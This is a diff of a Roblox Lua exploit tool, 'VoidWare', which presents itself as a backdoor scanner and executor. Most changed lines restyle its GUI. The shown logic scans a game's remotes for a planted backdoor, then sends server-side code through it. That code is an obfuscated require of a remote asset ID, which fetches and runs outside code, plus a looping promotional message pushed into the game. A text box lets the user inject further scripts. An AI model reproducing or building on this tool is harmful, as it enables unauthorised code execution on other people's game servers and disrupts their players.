@@ -41,215 +41,313 @@ local function dragify(Frame)
     end)
 end
 
-local scanningGUI = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
-scanningGUI.Name = "VoidWareScanner"
-scanningGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-scanningGUI.ResetOnSpawn = false
+G2L["ScreenGui_1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["ScreenGui_1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["ScreenGui_1"].Name = "VoidWareScanner"
+G2L["ScreenGui_1"].ResetOnSpawn = false
 
-CollectionService:AddTag(scanningGUI, "main")
+CollectionService:AddTag(G2L["ScreenGui_1"], "main");
 
-local VoidWare_2 = Instance.new("Frame", scanningGUI)
-VoidWare_2.BorderSizePixel = 0
-VoidWare_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-VoidWare_2.Size = UDim2.new(0.46186, 0, 0.65643, 0)
-VoidWare_2.Position = UDim2.new(0.26907, 0, 0.17179, 0)
-VoidWare_2.Name = "VoidWare"
+G2L["Frame_2"] = Instance.new("Frame", G2L["ScreenGui_1"]);
+G2L["Frame_2"]["BorderSizePixel"] = 0;
+G2L["Frame_2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Frame_2"]["Size"] = UDim2.new(0, 456, 0, 274);
+G2L["Frame_2"]["Position"] = UDim2.new(0, 210, 0, 12);
+G2L["Frame_2"]["BackgroundTransparency"] = 0.2;
+G2L["Frame_2"].Name = "VoidWare"
 
-local UICorner_3 = Instance.new("UICorner", VoidWare_2)
-UICorner_3.CornerRadius = UDim.new(0, 8)
 
-local UIStroke_a = Instance.new("UIStroke", VoidWare_2)
-UIStroke_a.Color = Color3.fromRGB(138, 0, 255)
-UIStroke_a.Thickness = 2
+G2L["Close_3"] = Instance.new("TextButton", G2L["Frame_2"]);
+G2L["Close_3"]["TextWrapped"] = true;
+G2L["Close_3"]["BorderSizePixel"] = 0;
+G2L["Close_3"]["TextSize"] = 48;
+G2L["Close_3"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["Close_3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Close_3"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Close_3"]["BackgroundTransparency"] = 0.7;
+G2L["Close_3"]["Size"] = UDim2.new(0, 30, 0, 30);
+G2L["Close_3"]["Text"] = "×";
+G2L["Close_3"]["Name"] = "Close";
+G2L["Close_3"]["Position"] = UDim2.new(0, 422, 0, 4);
 
-local TextLabel_6 = Instance.new("TextLabel", VoidWare_2)
-TextLabel_6.TextWrapped = true
-TextLabel_6.BorderSizePixel = 0
-TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
-TextLabel_6.TextScaled = true
-TextLabel_6.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
-TextLabel_6.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
-TextLabel_6.TextColor3 = Color3.fromRGB(153, 0, 255)
-TextLabel_6.Size = UDim2.new(0.98958, 0, 0.12931, 0)
-TextLabel_6.Text = "VoidWare"
-TextLabel_6.Position = UDim2.new(0, 2, 0, 2)
-TextLabel_6.ZIndex = 2
 
-local UICorner_7 = Instance.new("UICorner", TextLabel_6)
-UICorner_7.CornerRadius = UDim.new(0, 6)
+G2L["UICorner_4"] = Instance.new("UICorner", G2L["Close_3"]);
 
-local TextButton_8 = Instance.new("TextButton", VoidWare_2)
-TextButton_8.TextWrapped = true
-TextButton_8.BorderSizePixel = 0
-TextButton_8.TextScaled = true
-TextButton_8.TextColor3 = Color3.fromRGB(255, 0, 0)
-TextButton_8.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
-TextButton_8.Size = UDim2.new(0.07813, 0, 0.12931, 0)
-TextButton_8.Text = "×"
-TextButton_8.Position = UDim2.new(0, 352, 0, 2)
-TextButton_8.ZIndex = 2
 
-local UICorner_9 = Instance.new("UICorner", TextButton_8)
-UICorner_9.CornerRadius = UDim.new(0, 6)
 
-local TextButton2_4 = Instance.new("TextButton", VoidWare_2)
-TextButton2_4.TextWrapped = true
-TextButton2_4.BorderSizePixel = 0
-TextButton2_4.TextSize = 36
-TextButton2_4.TextColor3 = Color3.fromRGB(138, 0, 255)
-TextButton2_4.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
-TextButton2_4.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
-TextButton2_4.Size = UDim2.new(0.99479, 0, 0.83621, 0)
-TextButton2_4.Text = "Scan for backdoor"
-TextButton2_4.Name = "TextButton2"
-TextButton2_4.Position = UDim2.new(0, 2, 0, 36)
+G2L["UICorner_5"] = Instance.new("UICorner", G2L["Frame_2"]);
 
-local UICorner_5 = Instance.new("UICorner", TextButton2_4)
-UICorner_5.CornerRadius = UDim.new(0, 8)
 
-local StatusLabel = Instance.new("TextLabel", VoidWare_2)
-StatusLabel.TextWrapped = true
-StatusLabel.BorderSizePixel = 0
-StatusLabel.TextSize = 14
-StatusLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-StatusLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-StatusLabel.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
-StatusLabel.Size = UDim2.new(0.98958, 0, 0.08621, 0)
-StatusLabel.Text = "Ready to scan..."
-StatusLabel.Position = UDim2.new(0, 2, 0, 320)
-StatusLabel.Name = "StatusLabel"
 
-local UICorner_10 = Instance.new("UICorner", StatusLabel)
-UICorner_10.CornerRadius = UDim.new(0, 4)
+G2L["TextLabel_6"] = Instance.new("TextLabel", G2L["Frame_2"]);
+G2L["TextLabel_6"]["TextWrapped"] = true;
+G2L["TextLabel_6"]["BorderSizePixel"] = 0;
+G2L["TextLabel_6"]["TextSize"] = 12;
+G2L["TextLabel_6"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["TextLabel_6"]["TextScaled"] = true;
+G2L["TextLabel_6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["TextLabel_6"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["TextLabel_6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["TextLabel_6"]["BackgroundTransparency"] = 1;
+G2L["TextLabel_6"]["Size"] = UDim2.new(0, 444, 0, 144);
+G2L["TextLabel_6"]["Text"] = "About VoidWare:\nVoidWare is a free to use backdoor scanner with fast backdoor scanning.\nNot like something about VoidWare? (e.g UI, functioning, etc)\nContact St4rFl0w on discord to request some changes! :";
+G2L["TextLabel_6"]["Position"] = UDim2.new(0, 6, 0, 124);
 
-local executorGUI = Instance.new("ScreenGui", Players.LocalPlayer:WaitForChild("PlayerGui"))
-executorGUI.Name = "VoidWareExecutor"
-executorGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-executorGUI.Enabled = false
-executorGUI.ResetOnSpawn = false
 
-CollectionService:AddTag(executorGUI, "main")
+G2L["UIGradient_7"] = Instance.new("UIGradient", G2L["TextLabel_6"]);
+G2L["UIGradient_7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
 
-local VoidWareExecutor_2 = Instance.new("Frame", executorGUI)
-VoidWareExecutor_2.BorderSizePixel = 0
-VoidWareExecutor_2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-VoidWareExecutor_2.Size = UDim2.new(0.46186, 0, 0.65643, 0)
-VoidWareExecutor_2.Position = UDim2.new(0.26907, 0, 0.17179, 0)
-VoidWareExecutor_2.Name = "VoidWare"
 
-local UICorner_7b = Instance.new("UICorner", VoidWareExecutor_2)
-UICorner_7b.CornerRadius = UDim.new(0, 8)
+G2L["Title_8"] = Instance.new("TextLabel", G2L["Frame_2"]);
+G2L["Title_8"]["TextWrapped"] = true;
+G2L["Title_8"]["BorderSizePixel"] = 0;
+G2L["Title_8"]["TextSize"] = 28;
+G2L["Title_8"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["Title_8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Title_8"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Title_8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Title_8"]["BackgroundTransparency"] = 0.7;
+G2L["Title_8"]["Size"] = UDim2.new(0, 414, 0, 30);
+G2L["Title_8"]["Text"] = "VoidWare backdoor scanner";
+G2L["Title_8"]["Name"] = "Title";
+G2L["Title_8"]["Position"] = UDim2.new(0, 4, 0, 4);
 
-local UIStroke_10 = Instance.new("UIStroke", VoidWareExecutor_2)
-UIStroke_10.Color = Color3.fromRGB(138, 0, 255)
-UIStroke_10.Thickness = 2
 
-local TextLabel_a = Instance.new("TextLabel", VoidWareExecutor_2)
-TextLabel_a.TextWrapped = true
-TextLabel_a.BorderSizePixel = 0
-TextLabel_a.TextXAlignment = Enum.TextXAlignment.Left
-TextLabel_a.TextScaled = true
-TextLabel_a.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
-TextLabel_a.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
-TextLabel_a.TextColor3 = Color3.fromRGB(153, 0, 255)
-TextLabel_a.Size = UDim2.new(0.98958, 0, 0.12931, 0)
-TextLabel_a.Text = "VoidWare Executor"
-TextLabel_a.Position = UDim2.new(0, 2, 0, 2)
-TextLabel_a.ZIndex = 2
+G2L["UICorner_9"] = Instance.new("UICorner", G2L["Title_8"]);
 
-local UICorner_b = Instance.new("UICorner", TextLabel_a)
-UICorner_b.CornerRadius = UDim.new(0, 6)
 
-local TextButton_8b = Instance.new("TextButton", VoidWareExecutor_2)
-TextButton_8b.TextWrapped = true
-TextButton_8b.BorderSizePixel = 0
-TextButton_8b.TextScaled = true
-TextButton_8b.TextColor3 = Color3.fromRGB(255, 0, 0)
-TextButton_8b.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
-TextButton_8b.Size = UDim2.new(0.07813, 0, 0.12931, 0)
-TextButton_8b.Text = "×"
-TextButton_8b.Position = UDim2.new(0, 352, 0, 2)
-TextButton_8b.ZIndex = 2
 
-local UICorner_9b = Instance.new("UICorner", TextButton_8b)
-UICorner_9b.CornerRadius = UDim.new(0, 6)
+G2L["UIGradient_a"] = Instance.new("UIGradient", G2L["Title_8"]);
+G2L["UIGradient_a"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
 
-local TextBox_f = Instance.new("TextBox", VoidWareExecutor_2)
-TextBox_f.CursorPosition = -1
-TextBox_f.TextXAlignment = Enum.TextXAlignment.Left
-TextBox_f.PlaceholderColor3 = Color3.fromRGB(149, 149, 149)
-TextBox_f.BorderSizePixel = 0
-TextBox_f.TextSize = 18
-TextBox_f.TextYAlignment = Enum.TextYAlignment.Top
-TextBox_f.BackgroundColor3 = Color3.fromRGB(19, 19, 19)
-TextBox_f.FontFace = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
-TextBox_f.PlaceholderText = "Paste your script here..."
-TextBox_f.Size = UDim2.new(0.97917, 0, 0.67241, 0)
-TextBox_f.Position = UDim2.new(0, 4, 0, 36)
-TextBox_f.Text = ""
-TextBox_f.ClearTextOnFocus = false
 
-local UICorner_11 = Instance.new("UICorner", TextBox_f)
-UICorner_11.CornerRadius = UDim.new(0, 6)
+G2L["Scan_b"] = Instance.new("TextButton", G2L["Frame_2"]);
+G2L["Scan_b"]["TextWrapped"] = true;
+G2L["Scan_b"]["BorderSizePixel"] = 0;
+G2L["Scan_b"]["TextSize"] = 36;
+G2L["Scan_b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Scan_b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Scan_b"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal);
+G2L["Scan_b"]["BackgroundTransparency"] = 0.7;
+G2L["Scan_b"]["Size"] = UDim2.new(0, 448, 0, 56);
+G2L["Scan_b"]["Text"] = "Scan for backdoors";
+G2L["Scan_b"]["Name"] = "Scan";
+G2L["Scan_b"]["Position"] = UDim2.new(0, 4, 0, 38);
 
-local Exe_5 = Instance.new("TextButton", VoidWareExecutor_2)
-Exe_5.BorderSizePixel = 0
-Exe_5.TextSize = 24
-Exe_5.TextColor3 = Color3.fromRGB(112, 10, 255)
-Exe_5.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
-Exe_5.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
-Exe_5.Size = UDim2.new(0.20833, 0, 0.14655, 0)
-Exe_5.Text = "Execute"
-Exe_5.Name = "Exe"
-Exe_5.Position = UDim2.new(0, 4, 0, 196)
 
-local UICorner_6 = Instance.new("UICorner", Exe_5)
-UICorner_6.CornerRadius = UDim.new(0, 6)
+G2L["UICorner_c"] = Instance.new("UICorner", G2L["Scan_b"]);
 
-local Clear_3 = Instance.new("TextButton", VoidWareExecutor_2)
-Clear_3.BorderSizePixel = 0
-Clear_3.TextSize = 24
-Clear_3.TextColor3 = Color3.fromRGB(112, 10, 255)
-Clear_3.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
-Clear_3.FontFace = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
-Clear_3.Size = UDim2.new(0.20833, 0, 0.14655, 0)
-Clear_3.Text = "Clear"
-Clear_3.Name = "Clear"
-Clear_3.Position = UDim2.new(0, 88, 0, 196)
 
-local UICorner_4 = Instance.new("UICorner", Clear_3)
-UICorner_4.CornerRadius = UDim.new(0, 6)
 
-local Sens_d = Instance.new("TextButton", VoidWareExecutor_2)
-Sens_d.BorderSizePixel = 0
-Sens_d.TextSize = 18
-Sens_d.TextColor3 = Color3.fromRGB(255, 0, 0)
-Sens_d.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
-Sens_d.FontFace = Font.new("rbxasset://fonts/families/Ubuntu.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
-Sens_d.Size = UDim2.new(0.38021, 0, 0.14655, 0)
-Sens_d.Text = "Sensation Hub"
-Sens_d.Name = "Sens"
-Sens_d.Position = UDim2.new(0, 172, 0, 196)
+G2L["UIGradient_d"] = Instance.new("UIGradient", G2L["Scan_b"]);
+G2L["UIGradient_d"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
 
-local UICorner_e = Instance.new("UICorner", Sens_d)
-UICorner_e.CornerRadius = UDim.new(0, 6)
 
-local TextLabel2_c = Instance.new("TextLabel", VoidWareExecutor_2)
-TextLabel2_c.TextWrapped = true
-TextLabel2_c.BorderSizePixel = 0
-TextLabel2_c.TextSize = 16
-TextLabel2_c.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel2_c.FontFace = Font.new("rbxasset://fonts/families/Zekton.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
-TextLabel2_c.TextColor3 = Color3.fromRGB(50, 255, 0)
-TextLabel2_c.BackgroundTransparency = 1
-TextLabel2_c.RichText = true
-TextLabel2_c.Size = UDim2.new(0.15625, 0, 0.12931, 0)
-TextLabel2_c.Text = "Made by StarFlow"
-TextLabel2_c.Name = "TextLabel2"
-TextLabel2_c.Position = UDim2.new(0, 320, 0, 198)
+G2L["UIGradient_e"] = Instance.new("UIGradient", G2L["Frame_2"]);
+G2L["UIGradient_e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(35, 0, 80))};
 
-dragify(VoidWare_2)
-dragify(VoidWareExecutor_2)
+
+G2L["Status_f"] = Instance.new("TextLabel", G2L["Frame_2"]);
+G2L["Status_f"]["TextWrapped"] = true;
+G2L["Status_f"]["BorderSizePixel"] = 0;
+G2L["Status_f"]["TextScaled"] = true;
+G2L["Status_f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Status_f"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Status_f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Status_f"]["BackgroundTransparency"] = 0.7;
+G2L["Status_f"]["Size"] = UDim2.new(0, 448, 0, 22);
+G2L["Status_f"]["Text"] = "Status:";
+G2L["Status_f"]["Name"] = "Status";
+G2L["Status_f"]["Position"] = UDim2.new(0, 4, 0, 98);
+
+
+G2L["UICorner_10"] = Instance.new("UICorner", G2L["Status_f"]);
+
+
+
+G2L["UIGradient_11"] = Instance.new("UIGradient", G2L["Status_f"]);
+G2L["UIGradient_11"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
+
+
+G2L["UIStroke_12"] = Instance.new("UIStroke", G2L["Frame_2"]);
+
+G2L["ScreenGui_13"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["ScreenGui_13"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
+G2L["ScreenGui_13"].Name = "VoidWareExecutor"
+G2L["ScreenGui_13"].ResetOnSpawn = false
+G2L["ScreenGui_13"].Enabled = false
+
+CollectionService:AddTag(G2L["ScreenGui_13"], "main");
+
+G2L["Frame_14"] = Instance.new("Frame", G2L["ScreenGui_13"]);
+G2L["Frame_14"]["BorderSizePixel"] = 0;
+G2L["Frame_14"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Frame_14"]["Size"] = UDim2.new(0, 456, 0, 274);
+G2L["Frame_14"]["Position"] = UDim2.new(0, 210, 0, 12);
+G2L["Frame_14"]["BackgroundTransparency"] = 0.2;
+G2L["Frame_14"].Name = "VoidWareExecutor"
+
+
+G2L["Close_15"] = Instance.new("TextButton", G2L["Frame_14"]);
+G2L["Close_15"]["TextWrapped"] = true;
+G2L["Close_15"]["BorderSizePixel"] = 0;
+G2L["Close_15"]["TextSize"] = 48;
+G2L["Close_15"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["Close_15"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Close_15"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Close_15"]["BackgroundTransparency"] = 0.7;
+G2L["Close_15"]["Size"] = UDim2.new(0, 30, 0, 30);
+G2L["Close_15"]["Text"] = "×";
+G2L["Close_15"]["Name"] = "Close";
+G2L["Close_15"]["Position"] = UDim2.new(0, 422, 0, 4);
+
+
+G2L["UICorner_16"] = Instance.new("UICorner", G2L["Close_15"]);
+
+
+
+G2L["Sens_17"] = Instance.new("TextButton", G2L["Frame_14"]);
+G2L["Sens_17"]["TextWrapped"] = true;
+G2L["Sens_17"]["BorderSizePixel"] = 0;
+G2L["Sens_17"]["TextScaled"] = true;
+G2L["Sens_17"]["TextColor3"] = Color3.fromRGB(255, 0, 0);
+G2L["Sens_17"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Sens_17"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Sens_17"]["BackgroundTransparency"] = 0.7;
+G2L["Sens_17"]["Size"] = UDim2.new(0, 140, 0, 30);
+G2L["Sens_17"]["Text"] = "Sensation Hub";
+G2L["Sens_17"]["Name"] = "Sens";
+G2L["Sens_17"]["Position"] = UDim2.new(0, 214, 0, 240);
+
+
+G2L["UICorner_18"] = Instance.new("UICorner", G2L["Sens_17"]);
+
+
+
+G2L["UIGradient_19"] = Instance.new("UIGradient", G2L["Sens_17"]);
+G2L["UIGradient_19"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(195, 0, 0))};
+
+
+G2L["UIStroke_20"] = Instance.new("UIStroke", G2L["Frame_14"]);
+
+
+
+G2L["UICorner_21"] = Instance.new("UICorner", G2L["Frame_14"]);
+
+
+
+G2L["Text_22"] = Instance.new("TextLabel", G2L["Frame_14"]);
+G2L["Text_22"]["TextWrapped"] = true;
+G2L["Text_22"]["BorderSizePixel"] = 0;
+G2L["Text_22"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["Text_22"]["TextScaled"] = true;
+G2L["Text_22"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Text_22"]["FontFace"] = Font.new("rbxasset://fonts/families/ComicNeueAngular.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["Text_22"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Text_22"]["BackgroundTransparency"] = 0.7;
+G2L["Text_22"]["Size"] = UDim2.new(0, 92, 0, 28);
+G2L["Text_22"]["Text"] = "Have fun! :]";
+G2L["Text_22"]["Name"] = "Text";
+G2L["Text_22"]["Position"] = UDim2.new(0, 358, 0, 240);
+
+
+G2L["UICorner_23"] = Instance.new("UICorner", G2L["Text_22"]);
+
+
+
+G2L["UIGradient_24"] = Instance.new("UIGradient", G2L["Text_22"]);
+G2L["UIGradient_24"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(229, 229, 229)),ColorSequenceKeypoint.new(0.845, Color3.fromRGB(143, 143, 143)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(143, 143, 143))};
+
+
+G2L["Clr_25"] = Instance.new("TextButton", G2L["Frame_14"]);
+G2L["Clr_25"]["TextWrapped"] = true;
+G2L["Clr_25"]["BorderSizePixel"] = 0;
+G2L["Clr_25"]["TextScaled"] = true;
+G2L["Clr_25"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Clr_25"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Clr_25"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Clr_25"]["BackgroundTransparency"] = 0.7;
+G2L["Clr_25"]["Size"] = UDim2.new(0, 90, 0, 30);
+G2L["Clr_25"]["Text"] = "Clear";
+G2L["Clr_25"]["Name"] = "Clr";
+G2L["Clr_25"]["Position"] = UDim2.new(0, 120, 0, 240);
+
+
+G2L["UICorner_26"] = Instance.new("UICorner", G2L["Clr_25"]);
+
+
+
+G2L["UIGradient_27"] = Instance.new("UIGradient", G2L["Clr_25"]);
+G2L["UIGradient_27"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
+
+
+G2L["Exe_28"] = Instance.new("TextButton", G2L["Frame_14"]);
+G2L["Exe_28"]["TextWrapped"] = true;
+G2L["Exe_28"]["BorderSizePixel"] = 0;
+G2L["Exe_28"]["TextScaled"] = true;
+G2L["Exe_28"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Exe_28"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Exe_28"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Exe_28"]["BackgroundTransparency"] = 0.7;
+G2L["Exe_28"]["Size"] = UDim2.new(0, 110, 0, 30);
+G2L["Exe_28"]["Text"] = "Execute";
+G2L["Exe_28"]["Name"] = "Exe";
+G2L["Exe_28"]["Position"] = UDim2.new(0, 6, 0, 240);
+
+
+G2L["UICorner_29"] = Instance.new("UICorner", G2L["Exe_28"]);
+
+
+
+G2L["UIGradient_30"] = Instance.new("UIGradient", G2L["Exe_28"]);
+G2L["UIGradient_30"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
+
+
+G2L["UIGradient_31"] = Instance.new("UIGradient", G2L["Frame_14"]);
+G2L["UIGradient_31"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(35, 0, 80))};
+
+
+G2L["TextBox_32"] = Instance.new("TextBox", G2L["Frame_14"]);
+G2L["TextBox_32"]["CursorPosition"] = -1;
+G2L["TextBox_32"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["TextBox_32"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
+G2L["TextBox_32"]["BorderSizePixel"] = 0;
+G2L["TextBox_32"]["TextSize"] = 18;
+G2L["TextBox_32"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["TextBox_32"]["TextYAlignment"] = Enum.TextYAlignment.Top;
+G2L["TextBox_32"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["TextBox_32"]["FontFace"] = Font.new("rbxasset://fonts/families/Inconsolata.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["TextBox_32"]["PlaceholderText"] = "Require script here...";
+G2L["TextBox_32"]["Size"] = UDim2.new(0, 444, 0, 200);
+G2L["TextBox_32"]["Position"] = UDim2.new(0, 6, 0, 36);
+G2L["TextBox_32"]["Text"] = "";
+G2L["TextBox_32"]["BackgroundTransparency"] = 0.6;
+
+
+G2L["Title_33"] = Instance.new("TextLabel", G2L["Frame_14"]);
+G2L["Title_33"]["TextWrapped"] = true;
+G2L["Title_33"]["BorderSizePixel"] = 0;
+G2L["Title_33"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["Title_33"]["TextScaled"] = true;
+G2L["Title_33"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["Title_33"]["FontFace"] = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal);
+G2L["Title_33"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["Title_33"]["BackgroundTransparency"] = 0.7;
+G2L["Title_33"]["Size"] = UDim2.new(0, 414, 0, 30);
+G2L["Title_33"]["Text"] = "VoidWare backdoor scanner";
+G2L["Title_33"]["Name"] = "Title";
+G2L["Title_33"]["Position"] = UDim2.new(0, 4, 0, 4);
+
+
+G2L["UICorner_34"] = Instance.new("UICorner", G2L["Title_33"]);
+
+
+
+G2L["UIGradient_35"] = Instance.new("UIGradient", G2L["Title_33"]);
+G2L["UIGradient_35"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(168, 168, 168))};
+
+dragify(G2L["Frame_2"])
+dragify(G2L["Frame_14"])
 
 local backdoor = nil
 local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
@@ -278,8 +376,8 @@ local function runRemote(remote, data)
 end
 
 local function updateStatus(message, color)
-    StatusLabel.Text = message
-    StatusLabel.TextColor3 = color or Color3.fromRGB(200, 200, 200)
+    G2L["Status_f"].Text = "Status: " .. message
+    G2L["Status_f"].TextColor3 = color or Color3.fromRGB(255, 255, 255)
 end
 
 local function findRemote()
@@ -328,8 +426,8 @@ local function findRemote()
         for code,remote in remotes do
             if workspace:FindFirstChild(code) then
                 backdoor = remote
-                scanningGUI.Enabled = false
-                executorGUI.Enabled = true
+                G2L["ScreenGui_1"].Enabled = false
+                G2L["ScreenGui_13"].Enabled = true
 
                 runRemote(remote, "require(171016405.1884*69)")            
                 runRemote(remote, "a=Instance.new('Hint')a.Text='VoidWare | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
@@ -346,125 +444,105 @@ local function findRemote()
 end
 
 local function buttonClickEffect(button)
-    createTween(button, {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}, 0.1)
+    createTween(button, {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}, 0.1)
     task.wait(0.1)
-    createTween(button, {BackgroundColor3 = Color3.fromRGB(27, 27, 27)}, 0.1)
+    createTween(button, {BackgroundColor3 = Color3.fromRGB(0, 0, 0)}, 0.1)
 end
 
-TextButton2_4.MouseButton1Click:Connect(function()
-    TextButton2_4.Text = "Scanning..."
-    TextButton2_4.TextColor3 = Color3.fromRGB(255, 255, 0)
-    buttonClickEffect(TextButton2_4)
+G2L["Scan_b"].MouseButton1Click:Connect(function()
+    G2L["Scan_b"].Text = "Scanning..."
+    G2L["Scan_b"].TextColor3 = Color3.fromRGB(255, 255, 0)
